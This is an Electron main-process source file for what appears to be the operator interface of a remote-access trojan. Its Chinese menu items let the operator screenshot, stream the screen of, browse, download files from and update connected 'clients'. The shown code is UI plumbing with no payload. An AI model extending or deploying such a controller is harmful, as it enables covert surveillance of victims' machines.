"use strict";

import {
  app,
  protocol,
  BrowserWindow,
  ipcMain,
  Menu,
  MenuItem,
  ipcRenderer,
} from "electron";
import { createProtocol } from "vue-cli-plugin-electron-builder/lib";
import installExtension, { VUEJS_DEVTOOLS } from "electron-devtools-installer";
import path from "path";
const isDevelopment = process.env.NODE_ENV !== "production";

// Keep a global reference of the window object, if you don't, the window will
// be closed automatically when the JavaScript object is garbage collected.
let win;
let imgWin;

// Scheme must be registered before the app is ready
protocol.registerSchemesAsPrivileged([
  { scheme: "app", privileges: { secure: true, standard: true } },
]);

function createWindow() {
  // Create the browser window.
  win = new BrowserWindow({
    width: 800,
    height: 600,
    minHeight: 600,
    minWidth: 600,
    webPreferences: {
      // Use pluginOptions.nodeIntegration, leave this alone
      // See nklayman.github.io/vue-cli-plugin-electron-builder/guide/security.html#node-integration for more info
      // nodeIntegration: process.env.ELECTRON_NODE_INTEGRATION,
      nodeIntegration: true,
      preload: path.join(__dirname, "preload.js"),
    },
    frame: false,
    resizable: true,
    transparent: true,
  });

  if (process.env.WEBPACK_DEV_SERVER_URL) {
    // Load the url of the dev server if in development mode
    win.loadURL(process.env.WEBPACK_DEV_SERVER_URL);
    if (!process.env.IS_TEST) win.webContents.openDevTools();
  } else {
    createProtocol("app");
    // Load the index.html when not in development
    win.loadURL("app://./index.html");
    // win.loadFile("../public/index.html");
  }

  win.on("closed", () => {
    win = null;
  });
}

// Quit when all windows are closed.
app.on("window-all-closed", () => {
  // On macOS it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== "darwin") {
    app.quit();
  }
});

app.on("activate", () => {
  // On macOS it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (win === null) {
    createWindow();
  }
});

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on("ready", async () => {
  // if (isDevelopment && !process.env.IS_TEST) {
  //   // Install Vue Devtools
  //   try {
  //     await installExtension(VUEJS_DEVTOOLS);
  //   } catch (e) {
  //     console.error("Vue Devtools failed to install:", e.toString());
  //   }
  // }
  createWindow();
});

// Exit cleanly on request from parent process in development mode.
if (isDevelopment) {
  if (process.platform === "win32") {
    process.on("message", (data) => {
      if (data === "graceful-exit") {
        app.quit();
      }
    });
  } else {
    process.on("SIGTERM", () => {
      app.quit();
    });
  }
}

ipcMain.on("openDevTools", (e) => {
  // win.webContents.openDevTools();
  console.log(e.sender);
  e.sender.openDevTools();
});

ipcMain.on("clickClose", (e) => {
  console.log("X was clicked...");
  if (win) {
    win = null;
    app.exit();
  }
});
ipcMain.on("clickMax", (e, isMaximized) => {
  console.log("口 was clicked...");
  if (!isMaximized) {
    win.maximize();
  } else {
    win.unmaximize();
  }
});
ipcMain.on("clickMin", (e) => {
  console.log("- was clicked...");
  if (win) {
    win.minimize();
  }
});

ipcMain.on("file-context-menu", (event, msg, fileUrl) => {
  const template = [
    {
      label: "下载此文件",
      click: () => {
        // event.sender.send("context-menu-command", id);
        event.reply("downloadfile", msg.id, fileUrl);
      },
    },
    {
      label: "显示此文件内容",
      click: () => {
        // event.sender.send("context-menu-command", id);
        event.reply("showfilecontent", fileUrl);
      },
    },
    // { type: "separator" },

    // { label: "Menu Item 2", type: "checkbox", checked: true },
  ];
  const menu = Menu.buildFromTemplate(template);
  menu.popup(BrowserWindow.fromWebContents(event.sender));
});

ipcMain.on("show-context-menu", (event, msg) => {
  const template = [
    {
      label: "显示此客户端详细信息",
      click: () => {
        // event.sender.send("context-menu-command", id);
        event.reply("showClientDetails", msg.id);
      },
    },
    {
      label: "打开文件浏览器",
      click: () => {
        event.reply("showFileExplorer", msg.id);
      },
    },
    {
      label: "获取此客户端屏幕截图",
      click: () => {
        event.reply("getScreenshot", msg.id);
      },
    },
    {
      label: "开启此客户端屏幕推流",
      click: () => {
        event.reply("startVideoCapture", msg.id);
      },
    },
    { type: "separator" },
    {
      label: "更新此客户端",
      click: () => {
        event.reply("updateThisClient", msg.id, msg.newBackendName);
      },
    },
    // { label: "Menu Item 2", type: "checkbox", checked: true },
  ];
  const menu = Menu.buildFromTemplate(template);
  console.log(msg.id);
  menu.popup(BrowserWindow.fromWebContents(event.sender));
});

// ipcMain.on("showScreenshotWindow", (e, imgBase64) => {
//   imgWin = new BrowserWindow({
//     width: 800,
//     height: 600,
//     // parent: win,
//     // frame: false,
//   });
//   console.log(process.env.WEBPACK_DEV_SERVER_URL);
//   console.log(`${process.env.WEBPACK_DEV_SERVER_URL}/#/trojan/img/`);
//   if (process.env.WEBPACK_DEV_SERVER_URL) {
//     // Load the url of the dev server if in development mode
//     imgWin.loadURL(`${process.env.WEBPACK_DEV_SERVER_URL}/#/trojan/img/`);
//     if (!process.env.IS_TEST) win.webContents.openDevTools();
//   } else {
//     // createProtocol("app");
//     // Load the index.html when not in development
//     // win.loadURL("app://./index.html");
//     imgWin.loadFile("../public/index.html");
//   }
//   imgWin.on("show", () => {
//     imgWin.webContents.send("imgContent", imgBase64);
//   });
//   imgWin.show();
// });
